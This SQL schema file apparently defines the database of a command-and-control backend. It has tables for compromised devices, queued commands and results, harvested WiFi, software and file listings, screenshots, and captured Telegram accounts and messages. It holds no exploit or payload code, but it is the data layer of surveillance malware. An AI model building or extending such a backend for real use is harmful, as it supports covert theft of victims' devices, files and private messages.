
-- C2 Device
create table if not exists c2_device
(
    id           bigint auto_increment primary key,
    uuid         varchar(64)                        null,
    internalIp   varchar(64)                        null,
    externalIp   varchar(64)                        null,
    macAddress   varchar(64)                        null,
    hostName     varchar(128)                       null,
    os           varchar(128)                       null,
    softwareList longtext                           null,
    wifiData     longtext                           null,
    heartbeatInterval int                           default 60000,
    lastSeen     datetime                           null,
    createTime   datetime     default CURRENT_TIMESTAMP not null,
    updateTime   datetime     default CURRENT_TIMESTAMP not null,
    isDelete     tinyint      default 0             not null
);

-- C2 Task
create table if not exists c2_task
(
    id           bigint auto_increment primary key,
    taskId       varchar(64)                        not null,
    device_uuid  varchar(64)                        null,
    command      varchar(128)                       not null,
    params       text                               null,
    status       varchar(32)                        default 'pending' not null,
    result       longtext                           null,
    createTime   datetime     default CURRENT_TIMESTAMP not null,
    updateTime   datetime     default CURRENT_TIMESTAMP not null,
    isDelete     tinyint      default 0             not null
);

-- C2 WiFi
create table if not exists c2_wifi
(
    id             bigint auto_increment primary key,
    device_uuid    varchar(64)                        not null,
    ssid           varchar(128)                       null,
    bssid          varchar(64)                        null,
    signalStrength varchar(32)                        null,
    authentication varchar(64)                        null,
    createTime     datetime     default CURRENT_TIMESTAMP not null,
    isDelete       tinyint      default 0             not null
);

-- C2 Software
create table if not exists c2_software
(
    id             bigint auto_increment primary key,
    device_uuid    varchar(64)                        not null,
    name           varchar(256)                       null,
    version        varchar(128)                       null,
    installDate    varchar(64)                        null,
    createTime     datetime     default CURRENT_TIMESTAMP not null,
    isDelete       tinyint      default 0             not null
);

-- C2 File Scan
create table if not exists c2_file_scan
(
    id             bigint auto_increment primary key,
    device_uuid    varchar(64)                        not null,
    fileName       varchar(256)                       null,
    filePath       varchar(512)                       null,
    fileSize       bigint                             null,
    md5            varchar(64)                        null,
    lastModified   datetime                           null,
    isRecent       tinyint      default 0             null,
    createTime     datetime     default CURRENT_TIMESTAMP not null,
    isDelete       tinyint      default 0             not null
);

-- C2 Screenshot
create table if not exists c2_screenshot
(
    id             bigint auto_increment primary key,
    device_uuid    varchar(64)                        not null,
    taskId         varchar(64)                        null,
    url            varchar(512)                       null,
    createTime     datetime     default CURRENT_TIMESTAMP not null,
    isDelete       tinyint      default 0             not null
);

-- TG Account
create table if not exists tg_account
(
    id           bigint auto_increment primary key,
    tgId         varchar(64)                        null,
    username     varchar(128)                       null,
    phone        varchar(32)                        null,
    firstName    varchar(128)                       null,
    lastName     varchar(128)                       null,
    isBot        tinyint                            default 0,
    systemInfo   text                               null,
    createTime   datetime     default CURRENT_TIMESTAMP not null,
    updateTime   datetime     default CURRENT_TIMESTAMP not null,
    isDelete     tinyint      default 0             not null
);

-- TG Message
create table if not exists tg_message
(
    id           bigint auto_increment primary key,
    accountId    bigint                             not null,
    msgId        bigint                             null,
    chatId       varchar(64)                        null,
    senderId     varchar(64)                        null,
    content      text                               null,
    msgType      varchar(32)                        null,
    mediaPath    varchar(256)                       null,
    msgDate      datetime                           null,
    createTime   datetime     default CURRENT_TIMESTAMP not null,
    isDelete     tinyint      default 0             not null
);

-- User Table (t_user)
create table if not exists t_user
(
    id           bigint auto_increment primary key,
    userAccount  varchar(256)                           not null,
    userPassword varchar(512)                           not null,
    unionId      varchar(256)                           null,
    mpOpenId     varchar(256)                           null,
    userName     varchar(256)                           null,
    userAvatar   varchar(1024)                          null,
    userProfile  varchar(512)                           null,
    userRole     varchar(256) default 'user'            not null,
    createTime   datetime     default CURRENT_TIMESTAMP not null,
    updateTime   datetime     default CURRENT_TIMESTAMP not null,
    isDelete     tinyint      default 0                 not null
);

-- Post Table
create table if not exists post
(
    id           bigint auto_increment primary key,
    title        varchar(512)                           null,
    content      text                                   null,
    tags         varchar(1024)                          null,
    thumbNum     int          default 0                 not null,
    favourNum    int          default 0                 not null,
    userId       bigint                                 not null,
    createTime   datetime     default CURRENT_TIMESTAMP not null,
    updateTime   datetime     default CURRENT_TIMESTAMP not null,
    isDelete     tinyint      default 0                 not null
);
